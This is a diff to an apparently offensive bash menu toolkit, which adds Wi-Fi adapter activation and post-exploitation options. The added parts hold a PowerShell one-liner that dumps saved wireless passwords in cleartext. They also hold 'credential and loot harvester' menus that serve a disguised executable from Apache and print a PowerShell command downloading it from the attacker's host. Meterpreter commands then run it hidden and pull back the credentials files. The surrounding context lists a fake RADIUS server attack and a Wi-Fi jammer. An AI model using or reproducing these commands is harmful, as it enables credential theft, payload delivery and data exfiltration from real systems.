@@ -1243,11 +1243,26 @@ done
  echo -e "\E[1;34m::::: \e[97mOption 2 MUST Be Run AFTER Using The HostAPD-WPE Attack To Allow WLAN NIC To Function Normally\E[1;34m:::::"
  echo -e "\E[1;34m::::: \e[97m**WARNING** HostAPD-WPE Option Will *KILL ALL* Normal Network Connections For WLAN Interface Selected Until Option 2 Is Run!!\E[1;34m:::::"
  
-PS3='Enter your choice: ENTER=Options Menu | 8=Main Menu | 9=QUIT: '
-options=("Remove Wireless NIC from Network Manager" "Reset Wireless NIC for Network Manager Usage" "HostAPD-WPE Enterprise WiFi Fake RADIUS Server Attack" "Airgeddon" "Multi-Target Asleap Attack" "Multi-Target John The Ripper Attack" "WiFi Jammer" "Main Menu" "Quit")
+PS3='Enter your choice: ENTER=Options Menu | 11=Main Menu | 12=QUIT: '
+options=("Activate RTL8187 (Alfa AWUS036H) Wlan Adapter" "Activate RT2800USB (Ralink) Wlan Adapter" "Activate RTL8192 (Realtek) Wlan Adapter" "Remove Wireless NIC from Network Manager" "Reset Wireless NIC for Network Manager Usage" "HostAPD-WPE Enterprise WiFi Fake RADIUS Server Attack" "Airgeddon" "Multi-Target Asleap Attack" "Multi-Target John The Ripper Attack" "WiFi Jammer" "Main Menu" "Quit")
 select opt in "${options[@]}"
 do
     case $opt in
+		"Activate RTL8187 (Alfa AWUS036H) Wlan Adapter")
+	modprobe rtl8187 && ifconfig wlan1 up
+		    echo -e "\E[1;34m::::: \e[97mWireless NIC Active\E[1;34m:::::"
+		    ;;
+		"Activate RT2800USB (Ralink) Wlan Adapter")
+	#echo "options rt2800usb nohwcrypt=y" | tee /etc/modprobe.d/rt2800usb.conf 
+	#modprobe -rfv rt2800usb
+	#modprobe -v rt2800usb && ifconfig wlan1 up
+	modprobe rt2800usb && ifconfig wlan1 up
+		    echo -e "\E[1;34m::::: \e[97mWireless NIC Active\E[1;34m:::::"
+		    ;;
+		"Activate RTL8192 (Realtek) Wlan Adapter")
+	modprobe rtl8192cu && ifconfig wlan1 up
+		    echo -e "\E[1;34m::::: \e[97mWireless NIC Active\E[1;34m:::::"
+		    ;;
 		"Remove Wireless NIC from Network Manager")
 	#get MAC from wireless nic to be used in attack and add the MAC to /etc/NetworkManager/NetworkManager.conf (or where is best)
 	#[keyfile]
@@ -1340,8 +1355,8 @@ done
          
  echo -e "\E[1;34m::::: \e[97mData Exfiltration\E[1;34m:::::"
  
-PS3='Enter your choice: ENTER=Options Menu | 3=Main Menu | 4=QUIT: '
-options=("Push File To Target with SCP - Creds Required" "Data Exfiltration" "Main Menu" "Quit")
+PS3='Enter your choice: ENTER=Options Menu | 7=Main Menu | 8=QUIT: '
+options=("Push File To Target with SCP - Creds Required" "Data Exfiltration" "Push File To Target with PSH / Meterpreter" "Wireless Password Stealer" "Windows 64 bit Credenital & Loot Harvester" "Windows 32 bit Credenital & Loot Harvester" "Main Menu" "Quit")
 select opt in "${options[@]}"
 do
     case $opt in
@@ -1351,10 +1366,7 @@ do
 		    ;;
 		"Data Exfiltration")	
 	read -p 'Enter Remote File On Target Including Full Path (C:\\\\\Users\\\\\Profile\\\\\filename.ext): ' remoteuserfile; read -p 'Enter File Destination Full Path on Local Machine for MSF (/root/file.ext): ' msflocaluserpath; #read -p 'Set LHOST IP or Domain Name & Port (if necessary i.e., 1.1.1.1 OR 1.1.1.1:8080): ' userhost; read -p 'Enter Local File Webserver Path (filename.ext): ' webuserfile; read -p 'Enter File Destination Full Path on Local Machine for PSH (%WINDIR%\\System32\\file.ext): ' pshuserpath;
-		#echo -e "\E[1;34m::::: \e[97mWindows Terminal Command\E[1;34m:::::" 
-		#echo powershell \(new-object System.Net.WebClient\).DownloadFile\(\'http://$userhost/$webuserfile\',\'$pshuserpath\'\)
-		
-        echo -e "\E[1;34m::::: \e[97mMeterpreter Command\E[1;34m:::::" 
+		echo -e "\E[1;34m::::: \e[97mMeterpreter Command\E[1;34m:::::" 
         echo download \"$remoteuserfile\" \"$msflocaluserpath\"
 		    ;;
 		"Push File To Target with PSH / Meterpreter")
@@ -1374,6 +1386,89 @@ do
         echo -e "\E[1;34m::::: \e[97mMeterpreter Command\E[1;34m:::::" 
         echo upload $localuserfile $msfuserpath
             ;;
+        "Wireless Password Stealer")
+    echo -e "\E[1;34m::::: \e[97mA Powershell Terminal With Admin Rights Is Necessary \E[1;34m:::::"
+    echo -e "\E[1;34m::::: \e[97mPowershell Command To Get Wireless Passwords \E[1;34m:::::" 
+    echo ""
+    echo \(netsh wlan show profiles\) \| Select-String \"\\:\(.+\)\$\" \| \%\{\$name\=\$_.Matches \| \% \{\$_.Groups\[1\].Value.Trim\(\)\}\; \$_\} \| \%\{\(netsh wlan show profile name\=\""\$name\"" key\=clear\)\}  \| Select-String \""Key Content\\W+\\:(.+)\$\"" \| \%\{\$pass\=\$_.Matches \| \% \{\$_.Groups\[1\].Value.Trim\(\)\}\; \$_\} \| \%\{\[PSCustomObject\]@\{ "PROFILE_NAME"\=\$name\;PASSWORD\=\$pass \}\} \| Format-Table -AutoSize \| Out-File WiFi.txt
+    echo ""
+    echo -e "\E[1;34m::::: \e[97mA WiFi.txt File Will Be Created In The Directory From Which This Command Is Run \E[1;34m:::::" 
+    echo -e "\E[1;34m::::: \e[97mIMPORTANT! \E[1;34m:::::"
+    echo -e "\E[1;34m::::: \e[97mChange Directories Into One That Can Be Written To Without The Need For A UAC Prompt Before You Run This Command! \E[1;34m:::::" 
+    #echo ""
+	#echo -e "\E[1;34m::::: \e[97mPowershell Command To Get Install Configs\E[1;34m:::::" 
+	#echo \$F \= @\(\)\;\$F \+\= \"C:\\sysprep.inf\"\;\$F \+\= \"C:\\sysprep\\sysprep.xml\"\;\$F \+\= \"C:\\WINDOWS\\panther\\Unattend\\Unattended.xml\"\;\$F \+\= \"C:\\WINDOWS\\panther\\Unattended.xml\"\; \$i \= 0\; foreach\(\$file in \$F\) \{if \(Test-Path \$file\)\{cp \$file \c:\;\$i\+\+\}\}
+			;;
+        "Windows 64 bit Credenital & Loot Harvester")
+    SERVICE=Apache;
+	secs=$(date '+%S');
+	if service apache2 status | grep -v grep | grep running > /dev/null
+	then
+		echo "$SERVICE service running"
+	else
+		echo "$SERVICE is not running, Starting service." 
+		service apache2 start
+	fi 
+	cp ~/ATAT/word_x64.txt /var/www/html/word_x64.txt
+	chown www-data:www-data /var/www/html/word_x64.txt
+	read -p 'Set LHOST IP or Domain Name & Port (if necessary i.e., 1.1.1.1 OR 1.1.1.1:8080): ' userhost; read -p 'Enter File Destination Full Path on Target Machine for MSF (Recommended: %USERPROFILE%\\\\\\word_x64.exe): ' msfuserpath; read -p 'Enter File Destination Full Path on Target Machine for PSH (Recommended: %USERPROFILE%\\word_x64.exe): ' pshuserpath;
+		echo -e "\E[1;34m::::: \e[97mWindows Terminal Command \E[1;34m:::::" 
+		echo -e "\E[1;34m\e[97m \e[31m powershell \(new-object System.Net.WebClient\).DownloadFile\(\'http://$userhost/word_x64.txt\',\'$pshuserpath\'\)\e[97m\E[1;34m"
+			
+        echo -e "\E[1;34m::::: \e[97mMeterpreter Command \E[1;34m:::::" 
+        echo -e "\E[1;34m\e[97m \e[31m upload /root/ATAT/word_x64.txt $msfuserpath \e[97m\E[1;34m"
+        echo ""
+		echo -e "\E[1;34m::::: \e[97mRun These Commands Once The File Is On The Target \E[1;34m:::::" 
+		echo ":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
+		echo -e "\E[1;34m::::: \e[97mWindows Terminal Commands (Change Your Chosen File Path As Appropriate \E[1;34m:::::"
+		echo -e "\E[1;34m\e[97m \e[31m cd %USERPROFILE% \e[97m\E[1;34m"
+		echo -e "\E[1;34m\e[97m \e[31m word_x64.exe all -vv -oA \e[97m\E[1;34m"
+		echo ""
+		echo -e "\E[1;34m::::: \e[97mMeterpreter Command (Change Your Chosen File Path As Appropriate) \E[1;34m:::::"
+		echo -e "\E[1;34m\e[97m \e[31m cd %USERPROFILE% \e[97m\E[1;34m"
+		echo -e "\E[1;34m\e[97m \e[31m execute -H -c -i -f word_x86.exe -a 'all -vv -oA' \e[97m\E[1;34m"
+		echo ""
+		echo -e "\E[1;34m::::: \e[97mJSON & TXT \"credentials_xxxxxxxx_xxxxxx\" Output Files Are In The Directory You Ran This EXE From \E[1;34m:::::"
+		echo ""	
+		echo -e "\E[1;34m::::: \e[97m*EXAMPLE* Meterpreter Command To Download Your Loot \E[1;34m:::::"
+		echo -e "\E[1;34m\e[97m \e[31m download '%USERPROFILE%\\\\\\\credentials_23082018_182736.txt' /root/ATAT/ \e[97m\E[1;34m"
+		echo -e "\E[1;34m\e[97m \e[31m download '%USERPROFILE%\\\\\\\credentials_23082018_182736.json' /root/ATAT/ \e[97m\E[1;34m"
+			;;
+		"Windows 32 bit Credenital & Loot Harvester")
+    SERVICE=Apache;
+	secs=$(date '+%S');
+	if service apache2 status | grep -v grep | grep running > /dev/null
+	then
+		echo "$SERVICE service running"
+	else
+		echo "$SERVICE is not running, Starting service." 
+		service apache2 start
+	fi 
+	cp ~/ATAT/word_x86.txt /var/www/html/word_x86.txt
+	chown www-data:www-data /var/www/html/word_x86.txt
+	read -p 'Set LHOST IP or Domain Name & Port (if necessary i.e., 1.1.1.1 OR 1.1.1.1:8080): ' userhost; read -p 'Enter File Destination Full Path on Target Machine for MSF (Recommended: %USERPROFILE%\\\\\\word_x86.exe): ' msfuserpath; read -p 'Enter File Destination Full Path on Target Machine for PSH (Recommended: %USERPROFILE%\\word_x86.exe): ' pshuserpath;
+		echo -e "\E[1;34m::::: \e[97mWindows Terminal Command \E[1;34m:::::" 
+		echo -e "\E[1;34m\e[97m \e[31m powershell (new-object System.Net.WebClient).DownloadFile('http://$userhost/word_x86.txt','$pshuserpath')\e[97m\E[1;34m"
+			
+        echo -e "\E[1;34m::::: \e[97mMeterpreter Command \E[1;34m:::::" 
+        echo -e "\E[1;34m\e[97m \e[31m upload /root/ATAT/word_x86.txt $msfuserpath \e[97m\E[1;34m"
+        echo ""
+		echo -e "\E[1;34m::::: \e[97mRun These Commands Once The File Is On The Target \E[1;34m:::::" 
+		echo ":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
+		echo -e "\E[1;34m::::: \e[97mWindows Terminal Commands (Change Your Chosen File Path As Appropriate \E[1;34m:::::"
+		echo -e "\E[1;34m\e[97m \e[31m cd %USERPROFILE% \e[97m\E[1;34m"
+		echo -e "\E[1;34m\e[97m \e[31m word_x86.exe all -vv -oA \e[97m\E[1;34m"
+		echo ""
+		echo -e "\E[1;34m::::: \e[97mMeterpreter Command (Change Your Chosen File Path As Appropriate) \E[1;34m:::::"
+		echo -e "\E[1;34m\e[97m \e[31m cd %USERPROFILE% \e[97m\E[1;34m"
+		echo -e "\E[1;34m\e[97m \e[31m execute -H -c -i -f word_x86.exe -a 'all -vv -oA' \e[97m\E[1;34m"
+		echo ""
+		echo -e "\E[1;34m::::: \e[97mJSON & TXT \"credentials_xxxxxxxx_xxxxxx\" Output Files Are In The Directory You Ran This EXE From \E[1;34m:::::"
+		echo ""
+		echo -e "\E[1;34m::::: \e[97m*EXAMPLE* Meterpreter Command To Download Your Loot \E[1;34m:::::"
+		echo -e "\E[1;34m\e[97m \e[31m download '%USERPROFILE%\\\\\\\credentials_23082018_182736.txt' /root/ATAT/ \e[97m\E[1;34m"
+		echo -e "\E[1;34m\e[97m \e[31m download '%USERPROFILE%\\\\\\\credentials_23082018_182736.json' /root/ATAT/ \e[97m\E[1;34m"
+			;;
         "Main Menu")
             ~/ATAT/ATAT.sh
             ;;
